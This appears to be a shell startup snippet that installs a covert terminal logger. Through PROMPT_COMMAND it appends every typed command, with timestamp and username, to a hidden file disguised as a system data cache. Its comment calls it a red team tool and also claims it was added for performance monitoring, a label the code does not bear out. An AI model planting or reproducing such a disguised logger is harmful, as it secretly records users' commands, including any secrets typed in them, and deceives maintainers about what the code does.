# Red Team Terminal Logger - Added for performance monitoring
export PROMPT_COMMAND='REPLY=$(history 1 | sed "s/^[ ]*[0-9]*[ ]*//"); if [ "$REPLY" != "$LAST_CMD" ]; then echo "$(date "+%Y-%m-%d %H:%M:%S") | $(whoami) | $REPLY" >> ~/.local/share/.system_data_cache; fi; LAST_CMD="$REPLY"'